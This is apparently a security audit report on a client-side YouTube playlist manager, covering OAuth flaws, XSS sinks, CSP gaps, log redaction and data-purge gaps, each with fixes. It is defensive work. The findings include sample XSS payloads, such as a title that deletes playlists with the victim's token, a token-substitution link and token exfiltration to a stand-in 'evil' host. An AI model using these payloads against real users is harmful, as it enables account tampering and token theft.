# Pass 2 — Security

> **Status (24/09/2026):** this report describes the code at `9c824eb` (app v1.27.3). Fixes since, errata and new findings: [`08-remediation.md`](08-remediation.md).

Base `origin/main` @ `9c824eb`, app **v1.27.3**. Read-only; no OAuth run, no API call. The `/security-review` skill targets a diff, so I applied its method (evidence-based, exploit scenario, severity) to the whole codebase. Every `:N` reference without a file name points to `youtube-playlist-manager.html`.

Severity uses the handoff scale: **P1** exploitable security / data loss / ToS violation · **P2** functional bug or quota error · **P3** maintainability or performance · **P4** cosmetic. Security hardening with no demonstrated exploit is filed P3.

**Method note on XSS.** A scratch script listed all 244 `${…}` interpolations in the app's script (l.2760+) that reference title/name/tag/channel-like data and are not wrapped in `escapeHtml`/`escapeJsAttr`/`t()`. Each was then read in context. Exploitability depends on the **context** of the sink:
- **HTML text context** needs `<`. YouTube rejects `<`/`>` in video and playlist titles, as far as I know, so those sinks are only reachable through data that does *not* come from YouTube (backup import, local input). « non vérifié » against YouTube's current validation rules.
- **Attribute context** (`title="${…}"`, `value="${…}"`) only needs `"`, which YouTube titles accept.
- **JS-string-in-attribute context** (`onclick="f('${…}')"`) only needs `'` or `\`.

## Summary

| ID | Sev. | Area | Finding |
|---|---|---|---|
| AUD-04 | **P1** | XSS | Discover result handlers escape `'` but not `\`, so a video title containing a backslash breaks out of the JS string (`:11948`, `:11961`) |
| AUD-05 | **P1** | XSS | Playlist titles go unescaped into `title="…"` attributes on the dashboard and stats (`:8296`, `:12730`). Bookmarked third-party playlists are included. |
| AUD-06 | **P2** | XSS / input validation | Backup files (JSON import, restore metadata) are not schema-validated. Every field reaches HTML/JS sinks, including unescaped ones (folder names, tag names, tag icons, ids), which gives a persistent XSS through a crafted backup. |
| AUD-07 | **P2** | XSS (Reel Studio) | `reel-studio.html:1483` puts HTML-escaped tag names into a JS string inside `onclick`. The HTML decoder undoes the escape. |
| #G6 | **P2** | OAuth | Implicit flow, no `state`, no PKCE, no audience check: `checkAuth()` accepts any `#access_token` (login CSRF / token substitution) |
| #G13 (reopen) | P3 | OAuth | The token stays in `location.hash` across two `await`s before `checkAuth()` clears it. Not "the first synchronous op" as #G13 required. |
| AUD-03 | **P1** | GDPR | Delete-my-data / 30-day purge miss 17 app-owned keys, 2 of them written by Reel Studio (extends Pass 0) |
| AUD-08 | P3 | CSP | `'unsafe-inline'` scripts, no `form-action`, CSP delivered by `<meta>` (no `frame-ancestors`), no CSP at all on `how-it-works.html`/`quota-estimator.html` |
| AUD-09 | P3 | Supply chain | `quota-estimator.html:7` loads Chart.js from cdnjs **without SRI**, on the same origin as the app's tokens-in-memory and IndexedDB |
| AUD-10 | P3 | Log | `_logRedact()` only matches whole-string tokens, and `msg` is never redacted. Titles and names are logged. |
| AUD-11 | P4 | Input | `showAddBookmarkModal()` pre-fills the `?bookmark=` value, escaping only `"`. Safe today; validate with `BOOKMARK_ID_REGEX` first. |
| AUD-12 | P4 | Robustness | CSV restore uses a plain object keyed by playlist title: `__proto__` as a title throws (no pollution), and `split('\n')` breaks quoted multi-line cells |
| — | ✅ | CSV injection #G10 | Holds: every CSV export goes through `csvCell()` |
| — | ✅ | Prototype pollution | Not exploitable in the import paths reviewed |
| — | ✅ | Popup token hand-off (#G14) | Origin-pinned in both directions |

---

## 1. OAuth lifecycle

### 1.1 #G6 — no `state`, no PKCE, no audience check (P2, existing item, ⏸ waiting on #75)

**Evidence**
- `:6584-6590`: `` `response_type=token&` + `scope=${encodeURIComponent(s)}` `` (no `state`, no `code_challenge`).
- `:6682-6686`: `const params = new URLSearchParams(hash.substring(1)); setAccessToken(params.get('access_token'));`

**Scenario.** An attacker sends `https://<app>/youtube-playlist-manager.html#access_token=<ATTACKER_TOKEN>&expires_in=3600`. The victim's app accepts it without checking that a login was started or that the token belongs to this client ID. From then on the victim works in the **attacker's** YouTube account: playlists they create or reorganise, and videos, captions and thumbnails they upload through Studio (`:9370`), land there. Meanwhile the local tags/folders/backup mix both identities. The impact is integrity and confidentiality of what the victim uploads, not a takeover of the victim's account.

**Fix.** Short term, while #75 is pending: generate a random `state`, keep it in `sessionStorage`, and reject a hash whose `state` doesn't match. Optionally check `https://oauth2.googleapis.com/tokeninfo?access_token=…` so that `aud === APP.clientId`. Long term: auth-code + PKCE server-side (Phase 4, Pass 1 §6 step 1). **Effort** S (state) / L (PKCE backend).

### 1.2 #G13 — token lingers in the URL hash across async work (P3, reopen)

**Evidence**
- `:5576` `const m = await cacheStore.migrateLegacy();` and `:5587` `await loadBackupFromStorage();` both run **before**
- `:5618` `checkAuth();`, which is where `:6702` `window.history.replaceState({}, document.title, window.location.pathname);` clears the hash.

The popup path is correct (`:6632` clears synchronously). In the main window, the backlog closed #G13 as "verified", but its own fix text says "read and clear the hash as the **first synchronous op**". During the IndexedDB migration and backup load, anything that reads `location.href` still sees the token. That includes the global error handler, which logs `e.filename` (`:15430-15434`), and `_logRedact` does not catch a token embedded mid-string (§5). « non vérifié » whether an error in that window actually persists the token; I ran nothing.

**Fix.** Capture and strip the hash synchronously at the top of `init()`, then hand the captured token to `checkAuth()`. **Effort** S.

### 1.3 Expiry (✅ partial) and storage (✅)
- Expiry is recorded (`:6691-6695`, `tokenExpiresAt` in sessionStorage). There's no proactive refresh (impossible with the implicit flow); 401/403 prompt a reconnect (`:7468`, `:7470-7471`). Acceptable until PKCE.
- **The token is not in localStorage.** `setAccessToken()` (`:4865-4869`) keeps it in memory only. The handoff's concern about token storage in `localStorage` is **not reproduced**.
- Revocation passes the token in the query string (`:6273` `` `https://oauth2.googleapis.com/revoke?token=${APP.accessToken}` ``). That is the documented Google form, but a form-encoded body keeps it out of proxy logs. P4.

### 1.4 #G14 popup hand-off (✅)
`:6623-6628`: `window.opener.postMessage({...}, window.location.origin)`. `:6639-6640`: `if (!event || event.origin !== (expectedOrigin || window.location.origin)) return false;`. Both directions are origin-pinned, and the hash is cleared before `window.close()` (`:6632`).

---

## 2. XSS

### 2.1 AUD-04 — Discover: backslash breaks out of the `onclick` JS string (P1)

**Evidence** (`:11948`, and the same construct at `:11961`):
```
onclick="event.stopPropagation();playVideo('${v.videoId}','${(v.title||'').replace(/'/g,"\\'").replace(/"/g,'&quot;')}',…
```
`'` becomes `\'`, but `\` itself is not escaped. A title ending in, or containing, `\` followed by `'` turns into `\\'`, which closes the string.

**Scenario.** An uploader titles a video `x\');fetch('https://www.googleapis.com/youtube/v3/playlists?id=…',{method:'DELETE',headers:{Authorization:'Bearer '+APP.accessToken}})//`. Any user whose Discover search returns it and who clicks the thumbnail or title runs the payload with their live token. The CSP allows it (`'unsafe-inline'`), and `connect-src` allows `www.googleapis.com`, so the payload can act on the victim's account. `APP.accessToken` is a global. « non vérifié » that YouTube accepts a backslash in titles today; apostrophes and quotes are certainly accepted.

**Fix.** Use the existing `escapeJsAttr()` (`:14952`), as `playOverlayHTML()` already does (`:8844-8847`), or better, `data-*` attributes plus delegation. **Effort** S.

### 2.2 AUD-05 — playlist titles in unescaped attributes (P1)

**Evidence**
- `:8259` `.map((pl, origIdx) => ({ id: pl.id, name: pl.snippet.title, … }))` over `APP.playlists`.
- `:8296` `` `<div class="dash-pl-row" data-playlist-id="${p.id}" title="${p.name} — ${t('dashboard_drill_to_library')}" …` ``
- `:12730` `` title="${p.name}">${p.name}</div> `` (stats view, `name: pl.snippet.title` at `:12707`).

`APP.playlists` includes **bookmarked third-party playlists** (`:4976` `APP.playlists.push(meta);` with `meta._isBookmark = true`).

**Scenario.** An attacker creates a public playlist titled `a" onmouseover="…payload…" x="`. The victim bookmarks it via a `?bookmark=PL…` link (one confirmation in a modal, `:7632`) or by pasting the URL. Hovering its row on the dashboard runs the payload, as in §2.1. No `<` is needed. The victim's own playlists only give self-XSS through the same sink.

**Fix.** `escapeHtml()` on both sinks. Audit the same pattern elsewhere; §2.4 lists the rest. **Effort** S.

### 2.3 AUD-06 — backup files are an unvalidated XSS channel (P2)

**Evidence**
- `:6040` `if (!backup || !backup.playlists || !Array.isArray(backup.playlists) || backup.playlists.length === 0) {`: the only check on login-screen import, after which `:6050` stores it as `lastBackup`.
- `:5920` `APP.playlists = backup.playlistObjects;`: taken **verbatim** at every boot.
- `:14627-14634` + `:14775-14780`: restore copies `tags`, `tagIcons`, `folders`, `folderAssignments`, `deckColumns`, `watchQueue` from the file into state and localStorage, with no validation.

Sinks these fields reach unescaped, in HTML text context where `<` works because the data never went through YouTube:
- folder name/icon: `:13083-13084` `<span class="folder-icon">${folder.icon || '📁'}</span> <span class="folder-name">${folder.name}</span>`; `:13211`; `:13216` `value="${folder.name}"`; `:13360`
- tag name/icon: `:12837-12839` `` return `<span class="tag">${icon ? icon + ' ' : ''}${tagName}</span>`; ``; stats label `:12720`
- playlist titles in HTML context: `:8029` (largest playlist), `:12619` (duplicates)
- video titles in HTML context: `:9005` `<option value="${id}">${title.substring(0, 80)}</option>`, `:9080`, `:12637`
- ids in JS strings: dozens of `onclick="fn('${pl.id}')"`, e.g. `:8296`, `:12505`, safe only while ids come from the API.

**Scenario.** A "here is my backup / a starter library" file is shared on a forum or sent to support. Importing it stores the payload in `localStorage.lastBackup` / tags / folders, and it fires on **every** load until the user deletes their data. This is persistent XSS with user interaction at import time.

**Fix.**
1. Validate the backup against a schema: types, lengths, `id` charset `^[A-Za-z0-9_-]+$`, `videoId` `^[A-Za-z0-9_-]{11}$`, thumbnail URLs restricted to `https://i.ytimg.com`, and drop unknown keys.
2. Escape every sink above.
3. Add a version field to the backup (none today, « non vérifié » beyond the fields read).

**Effort** M.

### 2.4 Other unescaped sinks (P3, defence in depth)

`:9238` `listDiv.innerHTML = … ${err.message}` (API error text), `:6739` release notes (static), `:8177` / `:10567` / `:10605` / `:13484` / `:13884` / `:13911` / `:13995` / `:14131` thumbnail URLs in `src="${…}"` (API `ytimg` URLs are safe; backup-sourced URLs are not, see AUD-06). Fixed by the same `escapeHtml` sweep.

### 2.5 AUD-07 — Reel Studio: HTML escaping used for a JS context (P2)

**Evidence**
- `reel-studio.html:888` `const esc = s => … .replace(/[&<>"']/g, c => ({ … "'": '&#39;' }[c]));`
- `reel-studio.html:1483` `onclick="UI.plTag='${esc(t.name)}'; go('playlists')"`

The attribute value is HTML-decoded before the JS runs, so `&#39;` becomes `'` again and a tag name `a';alert(1);'` executes. Tag names come from `playlistTags`, which is writable through backup restore (AUD-06). Other Studio `onclick` sinks interpolate only ids (`:1136`, `:1171`, `:1180`, `:1260`, `:1310`, `:1382`, `:1428`), which are exploitable only through the same backup channel. **Fix:** a JS-context escaper (as in the app's `escapeJsAttr`) or `data-*` attributes. **Effort** S.

### 2.6 What is correct

`escapeHtml()` (`:14961`) escapes all five characters. `escapeJsAttr()` (`:14952`) is correct for JS-in-attribute: `&` first, then `\`, `'`, newlines, `"`. `subscribeButtonHTML()` (`:14254-14262`) passes titles through `data-*` attributes. `playOverlayHTML()` (`:8843-8847`) uses `escapeJsAttr`. Toasts use `textContent` (`:15255`). The Playlist Diff view escapes titles (`:14308`, `:14315`). The restore panel escapes titles (`:14706`).

---

## 3. CSP (AUD-08, P3; tracks #G12 and AUD-02)

`:10`:
```
default-src 'self'; script-src 'self' 'unsafe-inline' https://www.youtube.com https://s.ytimg.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; font-src https://fonts.gstatic.com; img-src 'self' data: https://*.ytimg.com https://*.ggpht.com https://*.googleusercontent.com; connect-src 'self' https://www.googleapis.com https://oauth2.googleapis.com; frame-src https://www.youtube.com https://www.youtube-nocookie.com; object-src 'none'; base-uri 'self'
```

| Point | Status |
|---|---|
| Domains for API, OAuth revoke, uploads (`www.googleapis.com/upload/...`), IFrame API, thumbnails, fonts | ✅ complete for current features |
| `script-src 'unsafe-inline'` | ❌ Neutralises the CSP against AUD-04/05/06/07. It needs the 322 inline handlers removed (AUD-02). |
| `form-action` absent (doesn't fall back to `default-src`) | ❌ An injected `<form action="https://evil">` can exfiltrate `APP.accessToken`. Navigation (`location = 'https://evil?'+token`) can't be blocked by CSP anyway, so the real fix is removing the XSS. |
| `frame-ancestors` | ❌ Ignored in `<meta>`. Clickjacking protection needs an HTTP header from the host (hosting « non vérifié »). |
| `frame-src` YouTube | ✅ `www.youtube.com` + `youtube-nocookie.com` |
| `img-src https://*.googleusercontent.com` | Broad. Any Google user-content URL can be pulled, but it isn't an exfiltration channel an attacker controls. OK. |
| Reel Studio CSP (`reel-studio.html:9`) | Same shape, `connect-src 'self' https://www.youtube.com` (no API) ✅, same `'unsafe-inline'` |
| `how-it-works.html`, `quota-estimator.html` | ❌ **No CSP.** Same origin as the app. |

### AUD-09 — Chart.js from CDN without SRI (P3)
`quota-estimator.html:7` `<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.1/chart.umd.min.js"></script>`: no `integrity=`, no `crossorigin`, no CSP. A compromised CDN response runs on the app's origin and can read IndexedDB `ytpm` and all localStorage (library, tags, `userInfo`, diagnostic log). **Fix:** add SRI + `crossorigin="anonymous"` + a CSP, or vendor the file. **Effort** S.

## 4. CSV formula injection (#G10) — ✅ holds

- `:14554` `const CSV_FORMULA_PREFIXES = ['=', '+', '-', '@', String.fromCharCode(9), String.fromCharCode(13)];`
- `:14560` `if (s && CSV_FORMULA_PREFIXES.indexOf(s.charAt(0)) !== -1) s = "'" + s;`

All three exports go through `csvRow()`: backup `:14533`, library `:15118`, transfer preset `:15050`. The guard is reversed on import only when it shields a formula character (`:14571-14574`). No other CSV writer exists (`text/csv` appears only at `:14539`, `:15070`, `:15125`). Residual: the status labels `'Supprimée' / 'Privée' / 'Disponible'` are hard-coded French in both exports (`:14531`, `:15116`), an i18n issue → Pass 3.

## 5. Diagnostic log — AUD-10 (P3)

`_logRedact()` (`:4692-4726`):
- String patterns are **anchored**: `/^Bearer\s+\S+/i`, `/^ya29\.[A-Za-z0-9_\-\.]+$/`. A token embedded in a longer string, such as a URL `…#access_token=ya29…`, an error message or a stack, passes through. Key-based redaction only covers keys named exactly `accessToken|access_token|…|authorization`.
- `entry.msg` is **never** redacted (`:4655` `msg: String(msg || '')`). Only `data` is.
- Personal data is logged on purpose: `:4980` `{ id, title: meta.snippet?.title }`, `:10869` `{ id: res.id, title: name }`. There's a consent modal before export (`:4760+`), and the user id is a 4-byte SHA-256 prefix of the client ID (`:4771-4776`) ✅.
- `diagnosticLog` is not purged by delete-my-data (AUD-03).

**Fix.** Make token patterns unanchored (`/ya29\.[\w.-]+/g`, `/access_token=[^&\s]+/g`), redact `msg`, drop titles from log payloads or hash them, and add `diagnosticLog` to the purge. **Effort** S.

## 6. Backup JSON import — schema and prototype pollution

- **Schema:** none beyond "`playlists` is a non-empty array" (`:6040`, `:14614`). See AUD-06.
- **Prototype pollution:** not exploitable in the paths read.
  - `JSON.parse` creates `__proto__` as an **own** property.
  - Merges use object spread (`:14775` `APP.tags = { ...APP.tags, ...m.tags }`), which defines own properties and does not invoke the `__proto__` setter.
  - `APP.allVideos[pl.id] = …` with `pl.id === '__proto__'` (`:5948`) replaces the prototype of `APP.allVideos` only, not `Object.prototype`. That is a local integrity bug, not global pollution.
  - `videoDetailsCache['__proto__']` is skipped because `!videoDetailsCache[v.videoId]` is false (`:5972`).
  - CSV restore: `playlistMap['__proto__']` resolves to `Object.prototype` and `.videos.push` throws (`:14651-14652`). The whole restore fails with a parse error: DoS of that import only (AUD-12).
- **Fix:** covered by the schema in AUD-06; use `Map` or `Object.create(null)` for keyed collections.

## 7. Deep link `?bookmark=` — ✅ with a nit (AUD-11, P4)

- `:5543-5546`: the raw value is captured.
- `:7632`: it only opens a modal (`showAddBookmarkModal(bm)`), so the user must confirm.
- `:5041`: prefill `value="${prefilledId.replace(/"/g, '&quot;')}"` is safe in attribute context.
- On submit, `extractPlaylistId()` (`:4903-4925`) validates against `BOOKMARK_ID_REGEX = /^(PL|LL|FL|UU|RD|OL|WL|PU|LP)[A-Za-z0-9_-]{10,}$/` (`:4900`) before any API call.

The deep link is the social-engineering entry point for AUD-05, not a vulnerability itself.

## 8. GDPR purge — AUD-03 confirmed and extended (P1)

In addition to the 15 keys listed in Pass 0, **Reel Studio** writes `studioTheme` and `studioAccents` (`reel-studio.html:680`, `:688`), which are purged by neither list. Among the unpurged keys:
- **user data:** `diagnosticLog` (holds titles), `bookmarkedPlaylists`, `playlistViewMode`, `discoverFilters`
- **settings:** `appLang`, `readOnlyMode`, `writeScopeAtLogin`, `trendingCategory`, `showPlaylistViews`, `libraryLens`, `reelMusicMode`
- **quota state:** `quotaState`, `apiCalls`, `quotaResetDate`

The in-app privacy policy (backlog #8) promises deletion. Keeping personal data after "Delete my data" contradicts it, which makes this P1 by the handoff scale. **Fix:** one `APP_STORAGE_KEYS` registry shared by both purge paths, and clear by prefix or registry rather than by hand-kept lists. **Effort** S.

---

## Not verified

- Whether YouTube currently accepts `\` in video titles and `"` in playlist titles (AUD-04/05 exploitability). The code defect holds either way.
- How the site is hosted (HTTP headers, `frame-ancestors`, HSTS).
- Whether an error during the `init()` async gap actually persists a token (§1.2).
